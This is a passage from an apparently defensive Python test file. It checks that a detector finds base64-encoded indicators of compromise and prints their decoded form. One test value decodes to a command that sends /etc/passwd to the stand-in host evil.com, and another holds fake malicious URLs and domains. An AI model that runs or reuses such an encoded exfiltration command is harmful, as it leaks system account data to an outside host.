...
@pytest.mark.parametrize("text, expected", [
    ...
    (
        ...
        ["aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnBocCBjdXJsIC1GIC9ldGMvcGFzc3dk "
         "(decoded: https://evil.com/payload.php curl -F /etc/passwd)"]
    ),

    # JSON with multiple IOCs
    (
        "eyJ1cmwiOiAiaHR0cDovL21hbGljaW91cy5zaXRlL2Rvd25sb2FkIiwgImRvbWFpbiI6ICJtYWxpY2lvdXMuc2l0ZSIsICJpcCI6ICIxOTIuMTY4LjAuMSJ9",
        ["eyJ1cmwiOiAiaHR0cDovL21hbGljaW91cy5zaXRlL2Rvd25sb2FkIiwgImRvbWFpbiI6ICJtYWxpY2lvdXMuc2l0ZSIsICJpcCI6ICIxOTIuMTY4LjAuMSJ9 "
         "(decoded: {\"url\": \"http://malicious.site/download\", \"domain\": \"malicious.site\", \"ip\": \"192.168.0.1\"})"]
    ),

    # Nested base64 (no recursion)
    (
        "YUdWc2JHOGdkMmxrYVc1bGNpNXNhVzVyYjNScGJtYz0=",
        ["YUdWc2JHOGdkMmxrYVc1bGNpNXNhVzVyYjNScGJtYz0= "
         "(decoded: aGVsbG8gd2lkaW5lci5saW5rb3Rpbmc=)"]
    ),

    # Long multiline payload
    (
